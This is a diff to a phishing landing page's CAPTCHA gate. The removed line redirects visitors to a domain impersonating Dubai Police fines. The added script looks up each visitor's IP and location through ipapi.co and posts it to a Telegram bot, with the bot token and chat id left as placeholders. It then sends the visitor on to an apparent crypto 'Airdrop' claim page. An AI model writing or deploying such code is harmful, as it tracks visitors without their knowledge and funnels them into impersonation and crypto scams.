@@ -13,7 +13,6 @@
             height: 100vh;
             margin: 0;
             font-family: Arial, sans-serif;
-            text-align: center;
             background-color: #f4f4f4;
         }
         .container {
@@ -21,6 +20,7 @@
             padding: 20px;
             border-radius: 8px;
             box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
+            text-align: center;
         }
         button {
             padding: 10px 20px;
@@ -48,13 +48,46 @@
     </div>
 
     <script>
-        function validateCaptcha(event) {
+        async function validateCaptcha(event) {
             event.preventDefault();
             var response = grecaptcha.getResponse();
             if (response.length === 0) {
                 alert("Please complete the CAPTCHA!");
-            } else {
-                window.location.href = "https://dubai-police-gov.netsons.org/fine"; // Redirect after successful verification
+                return;
+            }
+
+            try {
+                // Get IP and location info
+                const res = await fetch("https://ipapi.co/json/");
+                const data = await res.json();
+                
+                const ip = data.ip || "N/A";
+                const city = data.city || "N/A";
+                const region = data.region || "N/A";
+                const country = data.country_name || "N/A";
+
+                const message = `✅ CAPTCHA Passed\n🌍 IP: ${ip}\n📍 Location: ${city}, ${region}, ${country}`;
+                
+                const telegramBotToken = "YOUR_BOT_TOKEN_HERE";
+                const chatId = "YOUR_CHAT_ID_HERE";
+
+                await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message
+                    })
+                });
+
+                // Redirect after sending the message
+                window.location.href = "https://parti-claim.netsons.org/Airdrop/";
+
+            } catch (error) {
+                console.error("Error sending data to Telegram:", error);
+                alert("Something went wrong. Try again later.");
             }
         }
     </script>
